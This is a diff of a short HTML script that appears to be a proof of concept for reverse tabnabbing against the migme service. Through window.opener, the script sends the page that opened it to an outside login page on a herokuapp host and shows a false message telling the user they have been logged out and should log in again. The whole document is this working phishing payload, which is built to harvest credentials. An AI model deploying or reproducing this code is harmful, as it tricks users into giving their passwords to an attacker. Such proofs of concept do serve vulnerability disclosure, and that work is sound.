@@ -5,18 +5,14 @@
   <script type="text/javascript">
     if (window.opener) {
       document.write('<b>Found window.opener</b><br/>');
-    }
-    if (window.opener.document) {
-      document.write('<b>Found window.opener.document</b><br/>');
-      if (window.opener.document.cookie) {
-        document.write('<b>Found window.opener.document.cookie</b><br/>');
+
+      if (opener.location) {
+        document.write('<b>window.opener.location: ' + opener.location + '</b><br/>');
+        opener.location = 'https://hijackmigeid.herokuapp.com/login.html'  
+        document.write('<h1>Hey, you have been logged out from migme, check previous page and relogin again</h1>');
       }
     }
-    if (opener.location) {
-      document.write('<b>window.opener.location: ' + opener.location + '</b><br/>');
-      opener.location = 'https://hijackmigeid.herokuapp.com/login.html'  
-      document.write('<h1>Hey, you have been logged out from migme, check previous page and relogin again</h1>');
-    }
+    
     
   </script>
 </body>
